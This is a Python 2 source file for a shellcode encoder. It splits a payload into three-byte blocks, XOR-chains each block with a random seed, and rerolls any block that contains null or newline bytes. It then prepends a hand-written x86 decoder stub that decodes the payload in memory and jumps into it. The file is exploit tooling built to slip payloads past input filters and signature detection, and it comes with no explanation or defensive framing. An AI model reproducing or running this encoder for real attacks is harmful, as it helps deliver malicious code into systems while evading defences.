# -*- coding: utf-8 -*-
import random
import struct

SHELLCODE_FORMAT  = ""
SHELLCODE_FORMAT += "\xeb\x2e\x5e\x56\x89\xf7\x31\xc0\x31\xdb"
SHELLCODE_FORMAT += "\x31\xc9\x31\xd2\x8a\x06\x8a\x5e\x01\x30"
SHELLCODE_FORMAT += "\xd8\x88\x07\x47\x46\x41\x80\xf9\x03\x75"
SHELLCODE_FORMAT += "\xef\x46\x31\xc9\x66\x83\xc2\x04\x66\x81"
SHELLCODE_FORMAT += "\xfa%s\x75\xe1\xff\x14\x24\xe8\xcd"
SHELLCODE_FORMAT += "\xff\xff\xff%s"

def getPythonCode(code):
    codes = "shellcode = \""
    for c in code:
        cc = hex(ord(c))
        codes += "\\x0" + cc[2:] if len(cc)<4 else "\\x" + cc[2:]
    codes += "\""
    return codes

def xor(block):
    code = bytearray()
    seed = random.randint(1, 255)
    c1 = seed ^ block[0]
    c2 = c1 ^ block[1]
    c3 = c2 ^ block[2]
    code.append(seed)
    code.append(c1)
    code.append(c2)
    code.append(c3)

    return code

class Encoder(object):
    def __init__(self, shellcode, badchars="\x00\x0a"):
        self.shellcode = shellcode
        self.badchars = badchars

    def encode(self):
        codes = bytearray()
        codes.extend(self.shellcode)
        result = ""

        if len(codes)%3==1:
            codes.append(0x90)
            codes.append(0x90)
        elif len(codes)%3==2:
            codes.append(0x90)

        for i in xrange(0, len(codes), 3):
            pattern = codes[i:i+3]
            block = xor(pattern)
            block = self.check_bad_chars(pattern, block)
            result += block

        for bc in self.badchars:
            if struct.pack("<H", len(result)).find(bc)!=-1:
                result += "\x90"*4

        return SHELLCODE_FORMAT % (struct.pack("<H", len(result)), result)

    def check_bad_chars(self, orgin, block):
        for c in self.badchars:
            if block.find(c)!=-1:
                block = xor(orgin)
        return block
